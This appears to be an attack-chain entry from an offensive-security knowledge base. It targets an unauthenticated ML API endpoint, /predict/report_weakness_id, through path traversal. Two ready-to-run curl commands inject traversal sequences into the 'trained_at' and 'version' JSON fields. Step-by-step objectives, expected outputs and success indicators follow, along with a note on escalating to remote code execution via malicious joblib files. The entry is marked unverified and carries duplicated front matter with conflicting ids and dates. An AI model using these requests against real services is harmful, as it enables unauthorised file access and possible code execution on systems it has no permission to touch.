---
tags:
  - path-traversal
  - directory-traversal
  - file-read
  - rce-potential
  - ml-api
  - fastapi
  - python
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Docker
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Path-Traversal-via-trained_at]]'
  - '[[procedures/Exploit-Path-Traversal-via-version]]'
step_count: 2
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:28.716Z'
description: >-
  A multi-step attack exploiting path traversal in the
  /predict/report_weakness_id endpoint to load arbitrary files, potentially
  enabling remote code execution via malicious joblib files.
skill_level: intermediate
impact_level: high
id: 52149f71-1821-4131-80b0-e9528687e862
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174000
name: Path Traversal in ML API Endpoint for Arbitrary File Loading
type: attack_chain
description: A multi-step attack exploiting path traversal in the /predict/report_weakness_id endpoint to load arbitrary files, potentially enabling remote code execution via malicious joblib files.
verified: false
submitted: false
step_count: 2
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Exploit-Path-Traversal-via-trained_at]], [[procedures/Exploit-Path-Traversal-via-version]]
techniques: [[File and Directory Discovery]], [[Exploit Public-Facing Application]]
tactics: [[Discovery]], [[Initial Access]]
tags: path-traversal, directory-traversal, file-read, rce-potential, ml-api, fastapi, python
platforms: Web, Docker, Linux
tools: [[tools/curl]]
---

# Path Traversal in ML API Endpoint for Arbitrary File Loading

Multi-stage attack chain demonstrating exploitation of path traversal in an internal machine learning API for CWE classification, allowing arbitrary file loading and potential remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access ML API Endpoint] --> B[Traverse via trained_at Parameter]
    B --> C[Traverse via version Parameter]
    C --> D[Load Arbitrary Files / RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Target OS/Platform: Web application running in Docker container on Linux
- Required services/ports: Machine Learning API on port 8082
- Network access requirements: Localhost access to the Dockerized service or equivalent internal network position

### Initial Access Requirements

- Credential requirements: None (unauthenticated endpoint)
- Network position: Local or internal network to reach http://localhost:8082
- Prior access needed: Ability to send POST requests to the /predict/report_weakness_id endpoint

## Detailed Attack Procedures

### Step 1: Exploit Path Traversal via trained_at Parameter
procedure: [[procedures/Exploit-Path-Traversal-via-trained_at]]

**Objective**: Traverse directories using the trained_at parameter to access and load files outside the intended path, demonstrating arbitrary file read.

**Instructions**: Send a crafted POST request to the endpoint using [[commands/curl-path-traversal-trained_at]] to inject traversal sequences into the trained_at field.

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

**Expected Output**: The API attempts to load a file from a parent directory, potentially returning contents or errors revealing file access (e.g., tokenizer loading from unintended path).

**Success Indicators**:
- Response indicates file loading from traversed path (e.g., error or unexpected data)
- Confirmation of directory traversal via log inspection or response anomalies

### Step 2: Exploit Path Traversal via version Parameter
procedure: [[procedures/Exploit-Path-Traversal-via-version]]

**Objective**: Use the version parameter for directory traversal to further demonstrate vulnerability and attempt loading of arbitrary files, escalating to potential RCE if malicious files are accessible.

**Instructions**: Execute a POST request with traversal in the version parameter using [[commands/curl-path-traversal-version]].

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

**Expected Output**: Similar to Step 1, with file path resolution outside the base directory, possibly loading sensitive files or triggering code execution if a joblib file is targeted.

**Success Indicators**:
- Arbitrary file contents loaded or errors exposing system paths
- Potential RCE if a malicious joblib file is present and loaded via AutoTokenizer.from_pretrained

## Attack Chain Summary

### Key Achievements

1. Successful directory traversal using two distinct parameters in the ML API endpoint
2. Arbitrary file loading capability, bypassing intended path restrictions
3. Potential for remote code execution through loading of malicious serialized files like joblib

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Discovery]]
- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
